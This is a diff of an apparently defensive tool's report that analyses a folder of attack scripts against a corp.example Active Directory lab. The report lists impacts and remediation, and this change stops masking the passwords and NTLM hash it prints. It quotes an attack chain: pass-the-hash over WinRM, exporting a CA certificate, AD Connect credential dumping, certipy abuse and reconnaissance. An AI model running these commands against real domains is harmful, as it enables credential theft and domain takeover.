@@ -5,11 +5,11 @@ slopmop report   <folder>
 Impact
   [x] Credentials exposed
       Secrets, keys, certificates or stored passwords were read. Treat them as known to the attacker.
-      targets  file ca_backup.p12; hash of administrator@corp.example; password of MSOL_0a1b2c3d4e5f; password of Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; hash of administrator; password Ex*****! (8 chars); password of MSOL_0a1b2c3d4e5f@corp.example; password of svc_backup
-      what     CertificateExport: nxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x "certutil -exportPFX -p Ex*****! (8 chars) My $CA_THUMB ca_backup.p12" (20250301_104500_step07_exfil.sh:3)
+      targets  file ca_backup.p12; hash of administrator@corp.example; password of MSOL_0a1b2c3d4e5f; password of Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; hash of administrator; password Export1!; password of MSOL_0a1b2c3d4e5f@corp.example; password of svc_backup
+      what     CertificateExport: nxc winrm 10.20.1.23 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x "certutil -exportPFX -p Export1! My $CA_THUMB ca_backup.p12" (20250301_104500_step07_exfil.sh:3)
                nxc: nxc smb "$h" -u "$USER" -p "$PASS" -d $DOMAIN --shares (20250301_101800_step02_enum.sh:8)
-               nxc: nxc smb $AADC -u svc_backup -p 'Wi********! (11 chars)' -M msol > "$OUTFILE" 2>&1 (20250301_102300_step03_adsync.sh:7)
-               adconnectdump.py: adconnectdump.py corp.example/svc_backup:'Wi********! (11 chars)'@$AADC >> adsync_dump.log (20250301_102300_step03_adsync.sh:8)
+               nxc: nxc smb $AADC -u svc_backup -p 'Winter2025!' -M msol > "$OUTFILE" 2>&1 (20250301_102300_step03_adsync.sh:7)
+               adconnectdump.py: adconnectdump.py corp.example/svc_backup:'Winter2025!'@$AADC >> adsync_dump.log (20250301_102300_step03_adsync.sh:8)
                certipy: certipy find -u "$MSOL_USER@corp.example" -p "$MSOL_PASS" -dc-ip 10.20.1.5 -vulnerable -stdout (20250301_103200_step05_certs.sh:5)
                certipy: certipy auth -pfx "$PFX" -dc-ip 10.20.1.5 -username administrator -domain corp.example > 20250301_104010_step06_auth.txt (20250301_104000_step06_auth.sh:3)
                and 2 more in report.json
@@ -25,19 +25,19 @@ Impact
       files    20250301_101500_step01_recon.sh, 20250301_101800_step02_enum.sh, 20250301_102300_step03_adsync.sh and 4 more
   [i] Environment mapped
       Identities, resources or configuration were listed. Later steps were probably aimed with the result.
-      targets  username MSOL_0a1b2c3d4e5f; username Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; username administrator@corp.example; username svc_adsync; email Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; device AADC01; device CA01; device DC01; device aadc01.corp.example; device ca01.corp.example; device dc01.corp.example; ip 10.20.1.17; and 2 more
+      targets  username MSOL_0a1b2c3d4e5f; username Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; username administrator@corp.example; username svc_adsync; email Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; tenant corpexample.onmicrosoft.com; device AADC01; device CA01; device DC01; device aadc01.corp.example; device ca01.corp.example; device dc01.corp.example; and 3 more
       what     nmap: nmap -sn "$TARGET_NET" -oN "$OUT" (20250301_101500_step01_recon.sh:5)
                ldapsearch: ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" -b "DC=corp,DC=example" "(sAMAccountName=MSOL_*)" sAMAccountName > 20250301_101910_step02_users.tsv (20250301_101800_step02_enum.sh:10)
-      basis    Discovery tools, exposed username, exposed email, exposed device, exposed ip
+      basis    Discovery tools, exposed username, exposed email, exposed tenant, exposed device, exposed ip
 
 Remediation   (most urgent first)
   [x] Rotate what was read
       Rotate every secret, key and certificate that was read, and reset the accounts of any host whose credentials were dumped.
-      targets  file ca_backup.p12; hash of administrator@corp.example; password of MSOL_0a1b2c3d4e5f; password of Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; hash of administrator; password Ex*****! (8 chars); password of MSOL_0a1b2c3d4e5f@corp.example; password of svc_backup
-      what     CertificateExport: nxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x "certutil -exportPFX -p Ex*****! (8 chars) My $CA_THUMB ca_backup.p12" (20250301_104500_step07_exfil.sh:3)
+      targets  file ca_backup.p12; hash of administrator@corp.example; password of MSOL_0a1b2c3d4e5f; password of Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; hash of administrator; password Export1!; password of MSOL_0a1b2c3d4e5f@corp.example; password of svc_backup
+      what     CertificateExport: nxc winrm 10.20.1.23 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x "certutil -exportPFX -p Export1! My $CA_THUMB ca_backup.p12" (20250301_104500_step07_exfil.sh:3)
                nxc: nxc smb "$h" -u "$USER" -p "$PASS" -d $DOMAIN --shares (20250301_101800_step02_enum.sh:8)
-               nxc: nxc smb $AADC -u svc_backup -p 'Wi********! (11 chars)' -M msol > "$OUTFILE" 2>&1 (20250301_102300_step03_adsync.sh:7)
-               adconnectdump.py: adconnectdump.py corp.example/svc_backup:'Wi********! (11 chars)'@$AADC >> adsync_dump.log (20250301_102300_step03_adsync.sh:8)
+               nxc: nxc smb $AADC -u svc_backup -p 'Winter2025!' -M msol > "$OUTFILE" 2>&1 (20250301_102300_step03_adsync.sh:7)
+               adconnectdump.py: adconnectdump.py corp.example/svc_backup:'Winter2025!'@$AADC >> adsync_dump.log (20250301_102300_step03_adsync.sh:8)
                certipy: certipy find -u "$MSOL_USER@corp.example" -p "$MSOL_PASS" -dc-ip 10.20.1.5 -vulnerable -stdout (20250301_103200_step05_certs.sh:5)
                certipy: certipy auth -pfx "$PFX" -dc-ip 10.20.1.5 -username administrator -domain corp.example > 20250301_104010_step06_auth.txt (20250301_104000_step06_auth.sh:3)
                and 2 more in report.json
@@ -54,10 +54,10 @@ Remediation   (most urgent first)
       basis    FileUpload
   [i] Follow what was enumerated
       Use what was listed to predict targets: check those identities, vaults and hosts for later activity.
-      targets  username MSOL_0a1b2c3d4e5f; username Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; username administrator@corp.example; username svc_adsync; email Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; device AADC01; device CA01; device DC01; device aadc01.corp.example; device ca01.corp.example; device dc01.corp.example; ip 10.20.1.17; and 2 more
+      targets  username MSOL_0a1b2c3d4e5f; username Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; username administrator@corp.example; username svc_adsync; email Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; tenant corpexample.onmicrosoft.com; device AADC01; device CA01; device DC01; device aadc01.corp.example; device ca01.corp.example; device dc01.corp.example; and 3 more
       what     nmap: nmap -sn "$TARGET_NET" -oN "$OUT" (20250301_101500_step01_recon.sh:5)
                ldapsearch: ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" -b "DC=corp,DC=example" "(sAMAccountName=MSOL_*)" sAMAccountName > 20250301_101910_step02_users.tsv (20250301_101800_step02_enum.sh:10)
-      basis    Discovery tools, exposed username, exposed email, exposed device, exposed ip
+      basis    Discovery tools, exposed username, exposed email, exposed tenant, exposed device, exposed ip
 
 [x] HIGH - 4 impacts: 2 high, 2 low
 -> saved to <out>: report.txt, report.md, report.html, files.csv, trace.json, intents.csv, findings.json, targeted.json, exposure.csv, report.json
